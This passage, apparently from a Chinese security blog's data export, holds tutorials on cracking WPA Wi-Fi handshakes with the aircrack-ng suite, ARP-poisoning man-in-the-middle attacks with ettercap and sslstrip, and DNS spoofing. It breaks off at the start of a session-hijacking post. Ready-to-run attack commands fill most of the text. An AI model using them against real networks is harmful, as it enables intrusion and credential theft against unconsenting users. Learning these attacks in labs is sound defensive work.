![](/images/pasted-68.jpg)\n\n>抓到握手包后右上角会显示抓到包的客户端mac\n\n> ![](/images/pasted-66.jpg)\n\n##### 跑包\n\n* aircrack-ng -w [字典] [抓到的cap包]\n\n> ![](/images/pasted-67.jpg)","slug":"diary-2017-0412-01","published":1,"updated":"2017-06-08T03:08:35.324Z","photos":[],"link":"","_id":"cjvhjxaas000hiny2wuh0ljsi","content":"<h3 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h3><blockquote>\n<font color=\"#ff0000\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<strong>文中提及的部分技术，可能带有一定攻击性，仅供安全学习和教学用途，禁止非法使用！</strong></font>\n</blockquote>\n<h3 id=\"正文\"><a href=\"#正文\" class=\"headerlink\" title=\"正文\"></a>正文</h3><blockquote>\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;wifi有很多种方法，这里就说一下Aircrack-ng套件，Aircrack-ng就不多介绍了，一个非常经典的破解套件,也有很多其他的一些软件，水滴，奶瓶，cdlinux等这些就更不多说了，都是基于Aircrack-ng的<a id=\"more\"></a></p>\n</blockquote>\n<h5 id=\"扫描ap\"><a href=\"#扫描ap\" class=\"headerlink\" title=\"扫描ap\"></a>扫描ap</h5><blockquote>\n<p>准备一个无限网卡，然后ifconfig可以看到网卡信息,如果看不到是因为无线网卡没启用就ifconfig -a查看全部无线网卡，可以ifconfig wlan0 up来启用。</p>\n</blockquote>\n<blockquote>\n<p><img src=\"/images/pasted-64.jpg\" alt></p>\n</blockquote>\n<blockquote>\n<p>然后扫描一下附近的ap。</p>\n<ul>\n<li>airodump-ng wlan0<br>wlan0是ifconfig的网卡名称，<br>注意：<br>我用的是kali2.0，其他版本的可能需要airmon-ng start wlan0把网卡置于监听模式</li>\n</ul>\n</blockquote>\n<blockquote>\n<p><img src=\"/images/pasted-65.jpg\" alt></p>\n</blockquote>\n<blockquote>\n<p>下面的STATION为连接AP的客户端，看BSSID来区分客户端属于哪个AP的<br>注意：<br>抓包必须要有客户端连接才可以抓包。</p>\n</blockquote>\n<h5 id=\"抓握手包\"><a href=\"#抓握手包\" class=\"headerlink\" title=\"抓握手包\"></a>抓握手包</h5><blockquote>\n<p>扫描到AP信息后来抓包</p>\n<ul>\n<li>airodump-ng –bssid EC:88:8F:8A:9C:A0 -w mywifi -c 6 wlan0<br>-bssid 要抓的ap的mac<br>-w 保存的包名<br>-c 信道(就是扫描中的CH)<br>注意：<br>抓包中需要攻击ap，让客户端断线，客户端重新连接ap后才可以抓到包。<br>可以用aireplay-ng组件来攻击ap</li>\n<li>aireplay-ng -0 0 -a EC:88:8F:8A:9C:A0 wlan0<br>-0 冲突攻击模式<br>-a ap的mac</li>\n</ul>\n</blockquote>\n<blockquote>\n<p><img src=\"/images/pasted-68.jpg\" alt></p>\n</blockquote>\n<blockquote>\n<p>抓到握手包后右上角会显示抓到包的客户端mac</p>\n</blockquote>\n<blockquote>\n<p><img src=\"/images/pasted-66.jpg\" alt></p>\n</blockquote>\n<h5 id=\"跑包\"><a href=\"#跑包\" class=\"headerlink\" title=\"跑包\"></a>跑包</h5><ul>\n<li>aircrack-ng -w [字典] [抓到的cap包]</li>\n</ul>\n<blockquote>\n<p><img src=\"/images/pasted-67.jpg\" alt></p>\n</blockquote>\n","site":{"data":{}},"excerpt":"<h3 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h3><blockquote>\n<font color=\"#ff0000\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<strong>文中提及的部分技术，可能带有一定攻击性，仅供安全学习和教学用途，禁止非法使用！</strong></font>\n</blockquote>\n<h3 id=\"正文\"><a href=\"#正文\" class=\"headerlink\" title=\"正文\"></a>正文</h3><blockquote>\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;wifi有很多种方法，这里就说一下Aircrack-ng套件，Aircrack-ng就不多介绍了，一个非常经典的破解套件,也有很多其他的一些软件，水滴，奶瓶，cdlinux等这些就更不多说了，都是基于Aircrack-ng的","more":"</p>\n</blockquote>\n<h5 id=\"扫描ap\"><a href=\"#扫描ap\" class=\"headerlink\" title=\"扫描ap\"></a>扫描ap</h5><blockquote>\n<p>准备一个无限网卡，然后ifconfig可以看到网卡信息,如果看不到是因为无线网卡没启用就ifconfig -a查看全部无线网卡，可以ifconfig wlan0 up来启用。</p>\n</blockquote>\n<blockquote>\n<p><img src=\"/images/pasted-64.jpg\" alt></p>\n</blockquote>\n<blockquote>\n<p>然后扫描一下附近的ap。</p>\n<ul>\n<li>airodump-ng wlan0<br>wlan0是ifconfig的网卡名称，<br>注意：<br>我用的是kali2.0，其他版本的可能需要airmon-ng start wlan0把网卡置于监听模式</li>\n</ul>\n</blockquote>\n<blockquote>\n<p><img src=\"/images/pasted-65.jpg\" alt></p>\n</blockquote>\n<blockquote>\n<p>下面的STATION为连接AP的客户端，看BSSID来区分客户端属于哪个AP的<br>注意：<br>抓包必须要有客户端连接才可以抓包。</p>\n</blockquote>\n<h5 id=\"抓握手包\"><a href=\"#抓握手包\" class=\"headerlink\" title=\"抓握手包\"></a>抓握手包</h5><blockquote>\n<p>扫描到AP信息后来抓包</p>\n<ul>\n<li>airodump-ng –bssid EC:88:8F:8A:9C:A0 -w mywifi -c 6 wlan0<br>-bssid 要抓的ap的mac<br>-w 保存的包名<br>-c 信道(就是扫描中的CH)<br>注意：<br>抓包中需要攻击ap，让客户端断线，客户端重新连接ap后才可以抓到包。<br>可以用aireplay-ng组件来攻击ap</li>\n<li>aireplay-ng -0 0 -a EC:88:8F:8A:9C:A0 wlan0<br>-0 冲突攻击模式<br>-a ap的mac</li>\n</ul>\n</blockquote>\n<blockquote>\n<p><img src=\"/images/pasted-68.jpg\" alt></p>\n</blockquote>\n<blockquote>\n<p>抓到握手包后右上角会显示抓到包的客户端mac</p>\n</blockquote>\n<blockquote>\n<p><img src=\"/images/pasted-66.jpg\" alt></p>\n</blockquote>\n<h5 id=\"跑包\"><a href=\"#跑包\" class=\"headerlink\" title=\"跑包\"></a>跑包</h5><ul>\n<li>aircrack-ng -w [字典] [抓到的cap包]</li>\n</ul>\n<blockquote>\n<p><img src=\"/images/pasted-67.jpg\" alt></p>\n</blockquote>"},{"layout":"post","title":"内网王者之arp攻击","date":"2017-04-14T14:48:19.000Z","comments":1,"_content":"\n\n### 前言\n><font color=\"#ff0000\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;**文中提及的部分技术，可能带有一定攻击性，仅供安全学习和教学用途，禁止非法使用！**</font>\n\n\n### 正文\n>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;中间人攻击是好久之前的攻击手段了，早在高三的时候就已经玩透了。应该还有很多人不了解内网安全，我这里还是写出来一下。对于zANTI和DSploit这种就不多说了，我们这里使用老牌套件ettercap<!--more-->\n\n### 配置\n\n更改ettercap配置文件\n\n    vi /etc/ettercap/etter.conf\n\nesc键 然后 冒号(:) 然后 / 输入Linux。\n在配置文件中找到Linux字符串。\n\n> ![](/images/pasted-90.jpg)\n\n然后开启暂时路由转发\n\n    echo 1 > /proc/sys/net/ipv4/ip_forward\n\n> ![](/images/pasted-91.jpg)\n\n    * ettercap -i eth0 -Tq -M arp:remote /ip// /网关//\n\n * -i 选择网卡\n\n * -T 文本模式\n\n * -M Mitm\n\n* 后面的两组/，如果我选择内网里所有目标，可以不填ip。\n\n上面说的是命令行中攻击，当然ettercap也有图形化，下面我们使用图形化来简化攻击流程。\n\nettercap -G 运行图形化，选择Sniff => Unified sniffing , 来选择网卡 \n\n> ![](/images/pasted-92.jpg)\n\n然后Hosts => Scan for host 来扫描内网中的设备\n\n> ![](/images/pasted-93.jpg)\n\n扫描完毕后Host List显示内网中所有的设备\n\n> ![](/images/pasted-94.jpg)\n\n设备全部选择后，在把网关添加到target 1  其他设备添加到target 2中，\n\n然后选择Mitm => ARP poisoning 选择攻击模式\n\n> ![](/images/pasted-95.jpg)\n\n勾上 Sniff remote connections，确定\n\n> ![](/images/pasted-96.jpg)\n\n最后start => Start sniffing  开始攻击\n\n> ![](/images/pasted-97.jpg)\n\n<br/>\n\n如果网站用了ssl加密呢，那么可以使用sslstrip来针对ssl的攻击。\n\n10000为sslstrip的监听端口\n\n *  iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-ports 10000\n\n开启sslstrip，并且监听；\n\n * sslstrip -l 10000\n\nsslstrip会把https网址强制转换成http，然后再通过arp攻击就可以抓取明文信息了。\t\n\n### 总结\n\n攻击后受害者的所有流量都会经过攻击者，ettercap会自动抓取 TELNET、FTP、SSH、SMB、MySQL等等一些协议信息，同时也可以开wireshark来抓取更多的信息。","source":"_posts/diary-2017-0414-01.md","raw":"---\nlayout: post\ntitle: 内网王者之arp攻击\ndate: 2017-04-14 22:48:19\ncomments: true\ntags:\n\t- 安全攻防\n---\n\n\n### 前言\n><font color=\"#ff0000\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;**文中提及的部分技术，可能带有一定攻击性，仅供安全学习和教学用途，禁止非法使用！**</font>\n\n\n### 正文\n>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;中间人攻击是好久之前的攻击手段了，早在高三的时候就已经玩透了。应该还有很多人不了解内网安全，我这里还是写出来一下。对于zANTI和DSploit这种就不多说了，我们这里使用老牌套件ettercap<!--more-->\n\n### 配置\n\n更改ettercap配置文件\n\n    vi /etc/ettercap/etter.conf\n\nesc键 然后 冒号(:) 然后 / 输入Linux。\n在配置文件中找到Linux字符串。\n\n> ![](/images/pasted-90.jpg)\n\n然后开启暂时路由转发\n\n    echo 1 > /proc/sys/net/ipv4/ip_forward\n\n> ![](/images/pasted-91.jpg)\n\n    * ettercap -i eth0 -Tq -M arp:remote /ip// /网关//\n\n * -i 选择网卡\n\n * -T 文本模式\n\n * -M Mitm\n\n* 后面的两组/，如果我选择内网里所有目标，可以不填ip。\n\n上面说的是命令行中攻击，当然ettercap也有图形化，下面我们使用图形化来简化攻击流程。\n\nettercap -G 运行图形化，选择Sniff => Unified sniffing , 来选择网卡 \n\n> ![](/images/pasted-92.jpg)\n\n然后Hosts => Scan for host 来扫描内网中的设备\n\n> ![](/images/pasted-93.jpg)\n\n扫描完毕后Host List显示内网中所有的设备\n\n> ![](/images/pasted-94.jpg)\n\n设备全部选择后，在把网关添加到target 1  其他设备添加到target 2中，\n\n然后选择Mitm => ARP poisoning 选择攻击模式\n\n> ![](/images/pasted-95.jpg)\n\n勾上 Sniff remote connections，确定\n\n> ![](/images/pasted-96.jpg)\n\n最后start => Start sniffing  开始攻击\n\n> ![](/images/pasted-97.jpg)\n\n<br/>\n\n如果网站用了ssl加密呢，那么可以使用sslstrip来针对ssl的攻击。\n\n10000为sslstrip的监听端口\n\n *  iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-ports 10000\n\n开启sslstrip，并且监听；\n\n * sslstrip -l 10000\n\nsslstrip会把https网址强制转换成http，然后再通过arp攻击就可以抓取明文信息了。\t\n\n### 总结\n\n攻击后受害者的所有流量都会经过攻击者，ettercap会自动抓取 TELNET、FTP、SSH、SMB、MySQL等等一些协议信息，同时也可以开wireshark来抓取更多的信息。","slug":"diary-2017-0414-01","published":1,"updated":"2017-05-03T10:51:42.931Z","photos":[],"link":"","_id":"cjvhjxaat000iiny2ibmxzt0v","content":"<h3 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h3><blockquote>\n<font color=\"#ff0000\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<strong>文中提及的部分技术，可能带有一定攻击性，仅供安全学习和教学用途，禁止非法使用！</strong></font>\n</blockquote>\n<h3 id=\"正文\"><a href=\"#正文\" class=\"headerlink\" title=\"正文\"></a>正文</h3><blockquote>\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;中间人攻击是好久之前的攻击手段了，早在高三的时候就已经玩透了。应该还有很多人不了解内网安全，我这里还是写出来一下。对于zANTI和DSploit这种就不多说了，我们这里使用老牌套件ettercap<a id=\"more\"></a></p>\n</blockquote>\n<h3 id=\"配置\"><a href=\"#配置\" class=\"headerlink\" title=\"配置\"></a>配置</h3><p>更改ettercap配置文件</p>\n<pre><code>vi /etc/ettercap/etter.conf\n</code></pre><p>esc键 然后 冒号(:) 然后 / 输入Linux。<br>在配置文件中找到Linux字符串。</p>\n<blockquote>\n<p><img src=\"/images/pasted-90.jpg\" alt></p>\n</blockquote>\n<p>然后开启暂时路由转发</p>\n<pre><code>echo 1 &gt; /proc/sys/net/ipv4/ip_forward\n</code></pre><blockquote>\n<p><img src=\"/images/pasted-91.jpg\" alt></p>\n</blockquote>\n<pre><code>* ettercap -i eth0 -Tq -M arp:remote /ip// /网关//\n</code></pre><ul>\n<li><p>-i 选择网卡</p>\n</li>\n<li><p>-T 文本模式</p>\n</li>\n<li><p>-M Mitm</p>\n</li>\n</ul>\n<ul>\n<li>后面的两组/，如果我选择内网里所有目标，可以不填ip。</li>\n</ul>\n<p>上面说的是命令行中攻击，当然ettercap也有图形化，下面我们使用图形化来简化攻击流程。</p>\n<p>ettercap -G 运行图形化，选择Sniff =&gt; Unified sniffing , 来选择网卡 </p>\n<blockquote>\n<p><img src=\"/images/pasted-92.jpg\" alt></p>\n</blockquote>\n<p>然后Hosts =&gt; Scan for host 来扫描内网中的设备</p>\n<blockquote>\n<p><img src=\"/images/pasted-93.jpg\" alt></p>\n</blockquote>\n<p>扫描完毕后Host List显示内网中所有的设备</p>\n<blockquote>\n<p><img src=\"/images/pasted-94.jpg\" alt></p>\n</blockquote>\n<p>设备全部选择后，在把网关添加到target 1  其他设备添加到target 2中，</p>\n<p>然后选择Mitm =&gt; ARP poisoning 选择攻击模式</p>\n<blockquote>\n<p><img src=\"/images/pasted-95.jpg\" alt></p>\n</blockquote>\n<p>勾上 Sniff remote connections，确定</p>\n<blockquote>\n<p><img src=\"/images/pasted-96.jpg\" alt></p>\n</blockquote>\n<p>最后start =&gt; Start sniffing  开始攻击</p>\n<blockquote>\n<p><img src=\"/images/pasted-97.jpg\" alt></p>\n</blockquote>\n<p><br></p>\n<p>如果网站用了ssl加密呢，那么可以使用sslstrip来针对ssl的攻击。</p>\n<p>10000为sslstrip的监听端口</p>\n<ul>\n<li>iptables -t nat -A PREROUTING -p tcp –destination-port 80 -j REDIRECT –to-ports 10000</li>\n</ul>\n<p>开启sslstrip，并且监听；</p>\n<ul>\n<li>sslstrip -l 10000</li>\n</ul>\n<p>sslstrip会把https网址强制转换成http，然后再通过arp攻击就可以抓取明文信息了。    </p>\n<h3 id=\"总结\"><a href=\"#总结\" class=\"headerlink\" title=\"总结\"></a>总结</h3><p>攻击后受害者的所有流量都会经过攻击者，ettercap会自动抓取 TELNET、FTP、SSH、SMB、MySQL等等一些协议信息，同时也可以开wireshark来抓取更多的信息。</p>\n","site":{"data":{}},"excerpt":"<h3 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h3><blockquote>\n<font color=\"#ff0000\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<strong>文中提及的部分技术，可能带有一定攻击性，仅供安全学习和教学用途，禁止非法使用！</strong></font>\n</blockquote>\n<h3 id=\"正文\"><a href=\"#正文\" class=\"headerlink\" title=\"正文\"></a>正文</h3><blockquote>\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;中间人攻击是好久之前的攻击手段了，早在高三的时候就已经玩透了。应该还有很多人不了解内网安全，我这里还是写出来一下。对于zANTI和DSploit这种就不多说了，我们这里使用老牌套件ettercap","more":"</p>\n</blockquote>\n<h3 id=\"配置\"><a href=\"#配置\" class=\"headerlink\" title=\"配置\"></a>配置</h3><p>更改ettercap配置文件</p>\n<pre><code>vi /etc/ettercap/etter.conf\n</code></pre><p>esc键 然后 冒号(:) 然后 / 输入Linux。<br>在配置文件中找到Linux字符串。</p>\n<blockquote>\n<p><img src=\"/images/pasted-90.jpg\" alt></p>\n</blockquote>\n<p>然后开启暂时路由转发</p>\n<pre><code>echo 1 &gt; /proc/sys/net/ipv4/ip_forward\n</code></pre><blockquote>\n<p><img src=\"/images/pasted-91.jpg\" alt></p>\n</blockquote>\n<pre><code>* ettercap -i eth0 -Tq -M arp:remote /ip// /网关//\n</code></pre><ul>\n<li><p>-i 选择网卡</p>\n</li>\n<li><p>-T 文本模式</p>\n</li>\n<li><p>-M Mitm</p>\n</li>\n</ul>\n<ul>\n<li>后面的两组/，如果我选择内网里所有目标，可以不填ip。</li>\n</ul>\n<p>上面说的是命令行中攻击，当然ettercap也有图形化，下面我们使用图形化来简化攻击流程。</p>\n<p>ettercap -G 运行图形化，选择Sniff =&gt; Unified sniffing , 来选择网卡 </p>\n<blockquote>\n<p><img src=\"/images/pasted-92.jpg\" alt></p>\n</blockquote>\n<p>然后Hosts =&gt; Scan for host 来扫描内网中的设备</p>\n<blockquote>\n<p><img src=\"/images/pasted-93.jpg\" alt></p>\n</blockquote>\n<p>扫描完毕后Host List显示内网中所有的设备</p>\n<blockquote>\n<p><img src=\"/images/pasted-94.jpg\" alt></p>\n</blockquote>\n<p>设备全部选择后，在把网关添加到target 1  其他设备添加到target 2中，</p>\n<p>然后选择Mitm =&gt; ARP poisoning 选择攻击模式</p>\n<blockquote>\n<p><img src=\"/images/pasted-95.jpg\" alt></p>\n</blockquote>\n<p>勾上 Sniff remote connections，确定</p>\n<blockquote>\n<p><img src=\"/images/pasted-96.jpg\" alt></p>\n</blockquote>\n<p>最后start =&gt; Start sniffing  开始攻击</p>\n<blockquote>\n<p><img src=\"/images/pasted-97.jpg\" alt></p>\n</blockquote>\n<p><br></p>\n<p>如果网站用了ssl加密呢，那么可以使用sslstrip来针对ssl的攻击。</p>\n<p>10000为sslstrip的监听端口</p>\n<ul>\n<li>iptables -t nat -A PREROUTING -p tcp –destination-port 80 -j REDIRECT –to-ports 10000</li>\n</ul>\n<p>开启sslstrip，并且监听；</p>\n<ul>\n<li>sslstrip -l 10000</li>\n</ul>\n<p>sslstrip会把https网址强制转换成http，然后再通过arp攻击就可以抓取明文信息了。    </p>\n<h3 id=\"总结\"><a href=\"#总结\" class=\"headerlink\" title=\"总结\"></a>总结</h3><p>攻击后受害者的所有流量都会经过攻击者，ettercap会自动抓取 TELNET、FTP、SSH、SMB、MySQL等等一些协议信息，同时也可以开wireshark来抓取更多的信息。</p>"},{"layout":"post","title":"内网王者之dns劫持","date":"2017-04-14T16:26:45.000Z","comments":1,"_content":"\n### 前言\n><font color=\"#ff0000\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;**文中提及的部分技术，可能带有一定攻击性，仅供安全学习和教学用途，禁止非法使用！**</font>\n\n\n### 正文\n>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;同样不做多介绍，我们来使用ettercap这个老牌利器来完成这次实验。<!--more-->\n\n受害者\n ![](/images/pasted-63.PNG)\n\n攻击者\n ![](/images/pasted-64.PNG)\n\n### 配置\n>首先我们需要更改ettercap的dns配置文件，位置在于/etc/ettercap/etter.dns, 我们直接shift+g来到配置文件的最后，配置劫持的域名，和域名所解析的ip，可用*通配符\n\n ![](/images/pasted-65.PNG)\n\n\n>我把所有.com和.cn的域名全部解析到了本地，也就是说访问.com和.cn的域名，会自动解析我的ip地址。\n>\n>然后我们开启web服务器并且来到/var/www/html/路径，这里是默认weib服务器的网站目录，我们新建index.html内容随意。\n\n![](/images/pasted-70.PNG)\n\n### 攻击\n\n>配置完成之后我们就可以开始攻击了\n> * ettercap -i eth0 -Tq -P dns_spoof /ip// /网关//\n\n> * -i 选择网卡\n\n> * -T 文本模式\n\n> * -P 选择模块\n\n* 后面的两组/，如果我选择内网里所有目标，可以不填ip，\n\n>![](/images/pasted-66.PNG)\n\n>可以看到检测到了3个目标，\n\n> 我们来ping一下百度\n\n>![](/images/pasted-67.PNG)\n\n> 可以看到百度的解析ip变成了我们的ip，说明我们已经劫持成功了，我们来访问一下百度\n\n>![](/images/pasted-68.PNG)\n>\n>劫持成功，网页显示的是我们刚刚搭建web服务器中的内容，同时还会检测到访问的所有请求，全部都劫持解析到我们的ip中来。\n\n>也就是我们在配置文件上写的.com和.cn的域名全部会解析到我们的ip中来。\n\n>![](/images/pasted-69.PNG)\n\n\n\n\n\n","source":"_posts/diary-2017-0415-01.md","raw":"---\nlayout: post\ntitle: 内网王者之dns劫持\ndate: 2017-04-15 00:26:45\ncomments: true\ntags:\n\t- 安全攻防\n---\n\n### 前言\n><font color=\"#ff0000\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;**文中提及的部分技术，可能带有一定攻击性，仅供安全学习和教学用途，禁止非法使用！**</font>\n\n\n### 正文\n>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;同样不做多介绍，我们来使用ettercap这个老牌利器来完成这次实验。<!--more-->\n\n受害者\n ![](/images/pasted-63.PNG)\n\n攻击者\n ![](/images/pasted-64.PNG)\n\n### 配置\n>首先我们需要更改ettercap的dns配置文件，位置在于/etc/ettercap/etter.dns, 我们直接shift+g来到配置文件的最后，配置劫持的域名，和域名所解析的ip，可用*通配符\n\n ![](/images/pasted-65.PNG)\n\n\n>我把所有.com和.cn的域名全部解析到了本地，也就是说访问.com和.cn的域名，会自动解析我的ip地址。\n>\n>然后我们开启web服务器并且来到/var/www/html/路径，这里是默认weib服务器的网站目录，我们新建index.html内容随意。\n\n![](/images/pasted-70.PNG)\n\n### 攻击\n\n>配置完成之后我们就可以开始攻击了\n> * ettercap -i eth0 -Tq -P dns_spoof /ip// /网关//\n\n> * -i 选择网卡\n\n> * -T 文本模式\n\n> * -P 选择模块\n\n* 后面的两组/，如果我选择内网里所有目标，可以不填ip，\n\n>![](/images/pasted-66.PNG)\n\n>可以看到检测到了3个目标，\n\n> 我们来ping一下百度\n\n>![](/images/pasted-67.PNG)\n\n> 可以看到百度的解析ip变成了我们的ip，说明我们已经劫持成功了，我们来访问一下百度\n\n>![](/images/pasted-68.PNG)\n>\n>劫持成功，网页显示的是我们刚刚搭建web服务器中的内容，同时还会检测到访问的所有请求，全部都劫持解析到我们的ip中来。\n\n>也就是我们在配置文件上写的.com和.cn的域名全部会解析到我们的ip中来。\n\n>![](/images/pasted-69.PNG)\n\n\n\n\n\n","slug":"diary-2017-0415-01","published":1,"updated":"2017-04-22T17:09:01.680Z","photos":[],"link":"","_id":"cjvhjxaat000jiny2f9704m28","content":"<h3 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h3><blockquote>\n<font color=\"#ff0000\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<strong>文中提及的部分技术，可能带有一定攻击性，仅供安全学习和教学用途，禁止非法使用！</strong></font>\n</blockquote>\n<h3 id=\"正文\"><a href=\"#正文\" class=\"headerlink\" title=\"正文\"></a>正文</h3><blockquote>\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;同样不做多介绍，我们来使用ettercap这个老牌利器来完成这次实验。<a id=\"more\"></a></p>\n</blockquote>\n<p>受害者<br> <img src=\"/images/pasted-63.PNG\" alt></p>\n<p>攻击者<br> <img src=\"/images/pasted-64.PNG\" alt></p>\n<h3 id=\"配置\"><a href=\"#配置\" class=\"headerlink\" title=\"配置\"></a>配置</h3><blockquote>\n<p>首先我们需要更改ettercap的dns配置文件，位置在于/etc/ettercap/etter.dns, 我们直接shift+g来到配置文件的最后，配置劫持的域名，和域名所解析的ip，可用*通配符</p>\n</blockquote>\n<p> <img src=\"/images/pasted-65.PNG\" alt></p>\n<blockquote>\n<p>我把所有.com和.cn的域名全部解析到了本地，也就是说访问.com和.cn的域名，会自动解析我的ip地址。</p>\n<p>然后我们开启web服务器并且来到/var/www/html/路径，这里是默认weib服务器的网站目录，我们新建index.html内容随意。</p>\n</blockquote>\n<p><img src=\"/images/pasted-70.PNG\" alt></p>\n<h3 id=\"攻击\"><a href=\"#攻击\" class=\"headerlink\" title=\"攻击\"></a>攻击</h3><blockquote>\n<p>配置完成之后我们就可以开始攻击了</p>\n<ul>\n<li>ettercap -i eth0 -Tq -P dns_spoof /ip// /网关//</li>\n</ul>\n</blockquote>\n<blockquote>\n<ul>\n<li>-i 选择网卡</li>\n</ul>\n</blockquote>\n<blockquote>\n<ul>\n<li>-T 文本模式</li>\n</ul>\n</blockquote>\n<blockquote>\n<ul>\n<li>-P 选择模块</li>\n</ul>\n</blockquote>\n<ul>\n<li>后面的两组/，如果我选择内网里所有目标，可以不填ip，</li>\n</ul>\n<blockquote>\n<p><img src=\"/images/pasted-66.PNG\" alt></p>\n</blockquote>\n<blockquote>\n<p>可以看到检测到了3个目标，</p>\n</blockquote>\n<blockquote>\n<p>我们来ping一下百度</p>\n</blockquote>\n<blockquote>\n<p><img src=\"/images/pasted-67.PNG\" alt></p>\n</blockquote>\n<blockquote>\n<p>可以看到百度的解析ip变成了我们的ip，说明我们已经劫持成功了，我们来访问一下百度</p>\n</blockquote>\n<blockquote>\n<p><img src=\"/images/pasted-68.PNG\" alt></p>\n<p>劫持成功，网页显示的是我们刚刚搭建web服务器中的内容，同时还会检测到访问的所有请求，全部都劫持解析到我们的ip中来。</p>\n</blockquote>\n<blockquote>\n<p>也就是我们在配置文件上写的.com和.cn的域名全部会解析到我们的ip中来。</p>\n</blockquote>\n<blockquote>\n<p><img src=\"/images/pasted-69.PNG\" alt></p>\n</blockquote>\n","site":{"data":{}},"excerpt":"<h3 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h3><blockquote>\n<font color=\"#ff0000\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<strong>文中提及的部分技术，可能带有一定攻击性，仅供安全学习和教学用途，禁止非法使用！</strong></font>\n</blockquote>\n<h3 id=\"正文\"><a href=\"#正文\" class=\"headerlink\" title=\"正文\"></a>正文</h3><blockquote>\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;同样不做多介绍，我们来使用ettercap这个老牌利器来完成这次实验。","more":"</p>\n</blockquote>\n<p>受害者<br> <img src=\"/images/pasted-63.PNG\" alt></p>\n<p>攻击者<br> <img src=\"/images/pasted-64.PNG\" alt></p>\n<h3 id=\"配置\"><a href=\"#配置\" class=\"headerlink\" title=\"配置\"></a>配置</h3><blockquote>\n<p>首先我们需要更改ettercap的dns配置文件，位置在于/etc/ettercap/etter.dns, 我们直接shift+g来到配置文件的最后，配置劫持的域名，和域名所解析的ip，可用*通配符</p>\n</blockquote>\n<p> <img src=\"/images/pasted-65.PNG\" alt></p>\n<blockquote>\n<p>我把所有.com和.cn的域名全部解析到了本地，也就是说访问.com和.cn的域名，会自动解析我的ip地址。</p>\n<p>然后我们开启web服务器并且来到/var/www/html/路径，这里是默认weib服务器的网站目录，我们新建index.html内容随意。</p>\n</blockquote>\n<p><img src=\"/images/pasted-70.PNG\" alt></p>\n<h3 id=\"攻击\"><a href=\"#攻击\" class=\"headerlink\" title=\"攻击\"></a>攻击</h3><blockquote>\n<p>配置完成之后我们就可以开始攻击了</p>\n<ul>\n<li>ettercap -i eth0 -Tq -P dns_spoof /ip// /网关//</li>\n</ul>\n</blockquote>\n<blockquote>\n<ul>\n<li>-i 选择网卡</li>\n</ul>\n</blockquote>\n<blockquote>\n<ul>\n<li>-T 文本模式</li>\n</ul>\n</blockquote>\n<blockquote>\n<ul>\n<li>-P 选择模块</li>\n</ul>\n</blockquote>\n<ul>\n<li>后面的两组/，如果我选择内网里所有目标，可以不填ip，</li>\n</ul>\n<blockquote>\n<p><img src=\"/images/pasted-66.PNG\" alt></p>\n</blockquote>\n<blockquote>\n<p>可以看到检测到了3个目标，</p>\n</blockquote>\n<blockquote>\n<p>我们来ping一下百度</p>\n</blockquote>\n<blockquote>\n<p><img src=\"/images/pasted-67.PNG\" alt></p>\n</blockquote>\n<blockquote>\n<p>可以看到百度的解析ip变成了我们的ip，说明我们已经劫持成功了，我们来访问一下百度</p>\n</blockquote>\n<blockquote>\n<p><img src=\"/images/pasted-68.PNG\" alt></p>\n<p>劫持成功，网页显示的是我们刚刚搭建web服务器中的内容，同时还会检测到访问的所有请求，全部都劫持解析到我们的ip中来。</p>\n</blockquote>\n<blockquote>\n<p>也就是我们在配置文件上写的.com和.cn的域名全部会解析到我们的ip中来。</p>\n</blockquote>\n<blockquote>\n<p><img src=\"/images/pasted-69.PNG\" alt></p>\n</blockquote>"},{"layout":"post","title":"内网王者之会话劫持","date":"2017-04-14T17:02:14.000Z","comments":1,"_content":"\n### 前言\n><font color=\"#ff0000\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;**文中提及的部分技术，可能带有一定攻击性，仅供安全学习和教学用途，禁止非法使用！**</font>\n\n### 正文\n>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;同样不做多介绍，我们来使用ettercap这个老牌利器来完成这次实验。<!--more-->\n\n受害者\n ![](/images/pasted-63.PNG)\n\n攻击者\n ![](/images/pasted-64.PNG)\n\n\n### 环境\n\n用到的工具\n\n * ferret \n * tcpdump \n * Hamster\n\n其中ferret没有64位的，如果用的64位系统，需要安卓32位的ferret，而32位自带ferret。\n\n添加对32位应用程序的支持\n\n * dpkg --add-architecture i386\n\n安装32位ferret\n\n * 